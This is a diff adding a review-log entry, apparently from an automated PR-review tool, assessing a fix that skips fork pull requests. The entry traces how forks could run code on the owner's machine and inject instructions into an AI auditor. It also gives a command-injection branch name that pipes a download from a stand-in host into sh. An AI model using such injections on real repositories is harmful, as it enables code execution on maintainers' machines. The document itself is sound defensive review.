@@ -2,6 +2,25 @@
 
 Written by reviewctl (forge/reviewctl.py). Newest first.
 
+## PR #88 · 2026-10-30T00:22:41Z · MERGE · risk low · gate pass · merged
+
+Verdict: MERGE
+Risk: low
+
+## PR #88 reviewctl: a PR from a fork is left to the owner; PR body and comments are claims, not instructions
+What it changes: `reviewctl.run()` now skips any open PR whose `isCrossRepository` is true, before it calls `previous`, `gate`, `audit`, `fix`, `mark` or `record`; it only logs the skip. `pr_audit.md` tells the auditor to treat the PR body and comments as claims, not instructions. There is a new selftest check and a new README row.
+Findings:
+- info forge/reviewctl.py:196 The skip closes three real paths from a fork to the owner's box, all traced. The repo is PUBLIC and is itself a fork (`gh repo view`: visibility PUBLIC, isFork true, parent i098/Crewship), so anyone can open such a PR. (1) `gate()` fetches `pull/{n}/head` and runs base's `forge/selftest.py` in the merged worktree. selftest.py:41 `load`s `ROOT / "forge.py"` from that worktree, so the fork's code ran as the owner. (2) `audit()` gives the PR text to omp at `--approval-mode=yolo`. (3) `fix()` puts the fork-controlled `headRefName` into `git fetch -q origin {branch}` (reviewctl.py:139) under `shell=True`, and `git check-ref-format --branch 'x;curl${IFS}-s${IFS}e.vil|sh'` accepts that name. Same-repo PRs reach none of these through the new branch.
+- info forge/reviewctl.py:57 I ran the PR's exact `gh pr list ... ,isCrossRepository` (gh 2.103.0). It returns 26 open PRs, all `false`. Of all 88 PRs ever opened, 0 are cross-repo, so no scout PR gets dropped. If the key is missing, `.get` returns None and the PR takes the old path. If gh rejects the field, stdout is empty, `[]` comes back and nothing is processed, which fails closed.
+- info forge/selftest.py:486-491 With the PR applied, `python3 -m py_compile` and `python3 forge/selftest.py` print "all checks passed". With only the test hunk applied to base `reviewctl.py`, the check FAILS with `['audit', 'gate', 'mark base=newbase']`, so the test tells the two versions apart. Everything it touches is stubbed (`sh`, `record`, `mark`, `gate`, `audit`, `GH_REPO=selftest/none`), and the stubs are scoped to section 9. The existing PR #28 stubs have no `isCrossRepository` key and are still audited, which covers the default path.
+- info forge/prompts/pr_audit.md:3 The added sentence only makes the auditor more sceptical. It says nothing about protected paths, tests or verdict rules, and grants no permission. Nit: "The PR body ... text anyone with a GitHub account can write" is loose now that forks are skipped. An audited PR's body can only be edited by its author or a collaborator; the open vector is comments. The wording errs toward caution, so no change.
+- nit forge/reviewctl.py:4-5 The module docstring still says reviewctl reviews "anything else opened against the `forge` branch". That is stale after this change. It does not block the merge: the inline comment, the README row and the selftest all state and lock the real behaviour.
+- nit forge/reviewctl.py:196-201 A skipped fork PR is never `mark`ed, so the log line repeats every 30-minute run for each fork PR. Growth is capped by `gh pr list`'s default limit of 30 per run, and `review.log` already gets a line every run.
+- info (pre-existing, not counted) forge/reviewctl.py:57 `open_prs` has no `--limit`, and gh's default is 30 (`gh pr list --help`). 26 PRs are open now. The fork filter runs after listing, so a burst of fork PRs (listed newest first) could push scout PRs out of the window. That is starvation, not a bypass, and the PR did not introduce it.
+- info sibling PRs: no other open PR on `forge` touches `reviewctl.py` or `prompts/pr_audit.md`. I grepped the diffs of all 25 siblings that share `README.md`/`selftest.py` for fork, cross-repo, reviewctl and pr_audit: no hits. No sibling selftest hunk falls in section 9 (lines 456-486). #83 and #85 add README rows near line 76, which is a possible textual conflict only. Nothing contradicts or duplicates this PR.
+- info forge/README.md:80 The row matches the code: fork PRs are logged and left alone, and the prompt treats body and comments as claims. "0 of Crewship's 87 PRs are cross-repo" matches `gh pr list --state all` (0 of 88, counting #88). The 74-account, 61-repo incident is corroborated by public reports from 2026-10-29.
+
+
 ## PR #87 · 2026-10-29T22:19:44Z · MERGE WITH CHANGE · risk low · gate pass · fixed and merged (pushed)
 
 Verdict: MERGE WITH CHANGE
